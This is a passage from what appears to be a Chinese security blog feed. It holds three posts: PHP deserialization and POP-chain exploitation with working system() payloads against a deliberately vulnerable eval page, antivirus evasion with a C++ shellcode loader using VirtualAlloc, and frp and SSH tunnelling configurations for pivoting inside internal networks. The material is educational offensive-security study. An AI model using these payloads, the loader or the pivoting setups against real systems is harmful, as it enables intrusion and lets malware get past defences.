class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br>callxxx,a<br></code></pre></td></tr></table></figure><h4 id="6-9-3-get"><a href="#6-9-3-get" class="headerlink" title="6.9.3 __get()"></a>6.9.3 __get()</h4><p>触发时机：调用的成员属性不存在<br>返回值：不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2;<br><span class="hljs-meta">?&gt;</span><br><br>var2<br></code></pre></td></tr></table></figure><h4 id="6-9-4-set"><a href="#6-9-4-set" class="headerlink" title="6.9.4 __set()"></a>6.9.4 __set()</h4><p>触发时机：给不存在的成员属性赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> ,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>.<span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-variable">$arg2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2=<span class="hljs-number">1</span>;<br><span class="hljs-meta">?&gt;</span><br><br>var2,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="6-9-5-isset"><a href="#6-9-5-isset" class="headerlink" title="6.9.5 __isset()"></a>6.9.5 __isset()</h4><p>触发时机：对不可访问&#x2F;不存在属性使用isset()或empty()时，__isset()会被调用<br>参数：传参$arg1<br>返回值：不存在的成员属性的名称</p><h4 id="6-9-6-unset"><a href="#6-9-6-unset" class="headerlink" title="6.9.6 __unset()"></a>6.9.6 __unset()</h4><p>触发时机：对不可访问&#x2F;不存在属性使用unset()时<br>参数：传参$arg1<br>返回值：不存在的成员属性的名称</p><h4 id="6-9-7-clone"><a href="#6-9-7-clone" class="headerlink" title="6.9.7 __clone()"></a>6.9.7 __clone()</h4><p>触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</p><p><img src="/2023/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018184802915.png" alt="image-20231018184802915"></p><h2 id="7-POP链前置一"><a href="#7-POP链前置一" class="headerlink" title="7. POP链前置一"></a>7. POP链前置一</h2><h3 id="反序列化题目"><a href="#反序列化题目" class="headerlink" title="反序列化题目"></a>反序列化题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">normal</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">normal</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>反推：</strong></p><ol><li><strong>可利用漏洞点在函数eval()，21行，可执行命令</strong></li><li><strong>eval调用的是$test2</strong></li></ol><p><strong>关联点：</strong></p><ol><li><strong>执行代码的关键点在evil()类的action()方法中。那么，如何让$test调用evil中的成员方法action()</strong></li><li><strong>只能给$test赋值为evil对象</strong></li><li><strong>反序列化unserizlize()出发魔术方法触发destruct()</strong></li><li><strong>destruct()从test调用action()</strong></li></ol><p>因此可以先实例化出一个evil()对象$a，用来执行命令，<br>$a &#x3D; new evil();<br>$a-&gt;test2&#x3D;”system(‘whoami’);”;<br>再去实例化一个index()对象$b：<br>$b &#x3D; new index();<br>$b-&gt;test&#x3D;$a;<br>将$a的值赋值给$test即可。</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span> = <span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>?test&#x3D;O:5:”index”:1:{s:11:”%00index%00test”;O:4:”evil”:1:{s:5:”test2”;s:17:”system(%27whoami%27);”;}}</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12839954/1697598614235-26ca168a-7c64-4e7f-aa7c-3216fbe37cb0.png#averageHue=%23fefefe&clientId=u1b47080c-2b4c-4&from=paste&height=484&id=u28af248b&originHeight=737&originWidth=1326&originalType=binary&ratio=1.5234375&rotation=0&showTitle=false&size=74703&status=done&style=none&taskId=u81e3be95-b5bb-429b-a581-166b1e3af37&title=&width=870.4" alt="image.png"></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>个人觉得这种方法更方便些：<br>由于$test原先为私有，我们无法通过实例化对象$b去给test赋值，因此先将$test改为var即可。前面提到过，私有属性序列化后会变为%00类名%00属性，需要在序列化生成的字符串中修改：<br>O:5:”index”:1:{s:4:”test”;O:4:”evil”:1:{s:5:”test2”;s:14:”system(‘dir’);”;}}<br>O:5:”index”:1:{s:11:”%00index%00test”;O:4:”evil”:1:{s:5:”test2”;s:14:”system(‘dir’);”;}}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-variable">$a</span>-&gt;test2= <span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br>O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;index&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test2&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="8-POP链前置二"><a href="#8-POP链前置二" class="headerlink" title="8. POP链前置二"></a>8. POP链前置二</h2><p>所有魔术方法出发前提：魔术方法所在类（或对象）被调用<br>下面这段代码并不会触发wakeup()，因为我们生成的实例对象是sec，而sec这个类中并不存在wakeup()方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup is here!!&quot;</span>;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tostring is here!!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;O:3:&quot;</span>sec<span class="hljs-string">&quot;:1:&#123;s:6:&quot;</span>zunzun<span class="hljs-string">&quot;;N;&#125;&quot;</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>那么如何才能同时触发两个不同类下的wakeup方法以及toString方法呢？<br>温故一下：wakeup是在反序列化之前执行的，toString是当对象被当做字符串输出时才会去调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup is here!!&quot;</span>;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<span class="hljs-comment">#使toString触发的关键点在此处，如果将$source赋值为sec实例化对象,执行该段代码时就会触发tostring方法。</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tostring is here!!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;benben&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<span class="hljs-comment">#此处当实例化对象为fast时，便会触发wakeup</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>关键代码：<br>$a &#x3D; new fast();<br>$b &#x3D; new sec();<br>$a-&gt;source&#x3D;$b;<br>echo serialize($a);</p><h3 id="构造利用"><a href="#构造利用" class="headerlink" title="构造利用"></a>构造利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup is here!&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;toString is here&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fast</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sec</span>();<br><span class="hljs-variable">$a</span>-&gt;source=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br>O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;index&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test2&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12839954/1697622342049-a8b9e449-d55c-4522-ab26-ea2664666793.png#averageHue=%23fefdfd&clientId=uc3b1f4eb-c1ca-4&from=paste&height=417&id=ue1c35586&originHeight=635&originWidth=1327&originalType=binary&ratio=1.5234375&rotation=0&showTitle=false&size=77770&status=done&style=none&taskId=u2efe3238-6173-4eaa-9d99-a44ab236fc1&title=&width=871.0564102564102" alt="image.png"><br>wakeup是在反序列化前就执行的。</p><h2 id="9-POP链构造-and-POC编写"><a href="#9-POP链构造-and-POC编写" class="headerlink" title="9. POP链构造 and POC编写"></a>9. POP链构造 and POC编写</h2><p>在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在php反序列化中有一种漏洞利用方法叫**”面向属性编程”(pop).**<br>POP链就是利用<strong>魔术方法</strong>在里面<strong>进行多次跳转</strong>然后<strong>获取敏感数据</strong>的一种payload。</p>]]></content>
    
    
    <categories>
      
      <category>PHP反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀之绕过360</title>
    <link href="/2023/09/27/%E5%85%8D%E6%9D%80%E4%B9%8B%E7%BB%95%E8%BF%87360/"/>
    <url>/2023/09/27/%E5%85%8D%E6%9D%80%E4%B9%8B%E7%BB%95%E8%BF%87360/</url>
    
    <content type="html"><![CDATA[<h1 id="初识免杀"><a href="#初识免杀" class="headerlink" title="初识免杀"></a>初识免杀</h1><h2 id="无源码免杀"><a href="#无源码免杀" class="headerlink" title="无源码免杀"></a>无源码免杀</h2><ol><li>将我们的shellcode（cs中的payload）放在可执行内存中执行（内存：进程虚拟空间、堆栈空间）</li><li>远程上线（powershell、分离免杀【远程分离】）的方式，达到我们的目的。</li></ol><p>特征查杀：病毒库、病毒特征、字符串</p><p>行为查杀：上线的操作，cs beacon whoami ipconfig</p><p>云查杀：云端判断</p><p>内存查杀：卡巴斯基、AVST</p><p>常用免杀方式：</p><ul><li>混淆（xor-base64）</li><li>用一些不常见的API去调用</li><li>对shellcode直接加密(RC4、AES….)</li><li>如果编程能力很强的话，可以重构API，写成一个函数，然后进行调用</li><li>处理内存</li></ul><h3 id="windows-API"><a href="#windows-API" class="headerlink" title="windows API"></a>windows API</h3><p>很简单的就可以把它理解为一个函数，</p><p>常用的windows api 和函数：</p><ol><li>申请内存<ul><li><strong>VirtualAlloc</strong></li><li><strong>VirtualAllocEx</strong></li><li><strong>HeapAlloc</strong></li><li><strong>GlobalAlloc</strong></li><li><strong>CoTaskMenAlloc</strong></li></ul></li><li>移动内存<ul><li><strong>memcpy</strong></li><li><strong>CopyMemory</strong></li><li><strong>RtlCopyMemory</strong></li><li><strong>RtlMoveMemory</strong></li></ul></li><li>执行<ul><li>CreateThread</li><li>WaitForSingleObject</li></ul></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> code[] = <span class="hljs-string">&quot;xxxx&quot;</span>;<br>    LPVOID addr = <span class="hljs-built_in">VirtualAlloc</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-built_in">sizeof</span>(code),<br>        MEM_COMMIT,<br>        PAGE_EXECUTE_READWRITE<br>    );<br>    # 使用virtualalloc函数分配内存，以便将二进制代码复制其中，分配的内存页的属性被设置为“PAGE_EXECUTE_READWRITE”,以便可以在其中执行代码<br><br>    <span class="hljs-built_in">memcpy</span>(addr,code,<span class="hljs-built_in">sizeof</span>(code));<br>    ((<span class="hljs-built_in">void</span>(*)())addr)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="有源码的免杀"><a href="#有源码的免杀" class="headerlink" title="有源码的免杀"></a>有源码的免杀</h2><ul><li>修改杀软杀的部分</li><li>加垃圾资源</li><li>重写</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网代理</title>
    <link href="/2023/09/26/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
    <url>/2023/09/26/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h1><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><h3 id="frps-ini"><a href="#frps-ini" class="headerlink" title="frps.ini"></a>frps.ini</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[common]<br>bind_addr = 192.168.85.11（也就是服务端地址，kali）<br>bind_port = 7000<br><br>dashboard_addr = 服务端ip<br>dashboard_port = 5200<br>dashboard_user = admin<br>dashboard_pwd = admin@134625<br>dashboard_dir = ./static<br><br>配置完成后启动监听：./frps &amp;<br><br><span class="hljs-section">tips:</span><br>停止：ps -aux|grep frp| grep -v grep <span class="hljs-comment">#先找到pid号</span><br>kill -9 pid<br></code></pre></td></tr></table></figure><h3 id="frpc-ini"><a href="#frpc-ini" class="headerlink" title="frpc.ini"></a>frpc.ini</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">frpc.ini：<br>[common]<br>server_addr = 192.168.85.11<br>server_port = 7000<br><br>[plugin_socks5]<br>type = tcp<br>remote_port = 7777 <span class="hljs-comment">#通信端口</span><br>plugin = socks5<br>plugin_user = admin<br>plugin_passwd = admin<br><br>配置完成后启动：frpc.exe -c frpc.ini<br><br></code></pre></td></tr></table></figure><h3 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf: vi <span class="hljs-regexp">/etc/</span>proxychains4.conf<br>在最后一行加入：<br>socks5 <span class="hljs-number">192.168</span>.<span class="hljs-number">85.11</span> <span class="hljs-number">7777</span>  <span class="hljs-comment">#这里的端口选择通信端口</span><br><br></code></pre></td></tr></table></figure><h3 id="proxifier"><a href="#proxifier" class="headerlink" title="proxifier"></a>proxifier</h3><p>添加代理服务器，也就是kali：192.168.85.11</p><p><img src="/2023/09/26/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/3.png" alt="image-20230926095637075"></p><p>代理规则选择：</p><p><img src="/2023/09/26/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/2.png" alt="image-20230926095724211"></p><p>浏览器chrome.exe添加进去，就可以在windows访问内网网址。</p><h2 id="ssh隧道技术"><a href="#ssh隧道技术" class="headerlink" title="ssh隧道技术"></a>ssh隧道技术</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p><img src="/2023/09/26/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/1.png" alt="image-20230926093013576"></p><p>在web服务器上做正向连接</p><p>ssh –CNfL 0.0.0.0:7777:10.10.10.128:80 <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#46;&#49;&#52;&#x34;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#46;&#49;&#52;&#x34;</a></p><p>随后提示输入密码，便可</p><p>C:压缩传输，提高传输速度<br>N:不执行远程命令，用于端口转发<br>L:本地端口转发<br>f:后台执行</p><p>将10.10.10.128这台机器的80端口转发到192.168.0.144这台机器的7777端口上，</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>ssh -qTfnN -R port:host:hostport  remote_ip</p><p>ssh –qTfnN –R 2222:127.0.0.1:22  <a 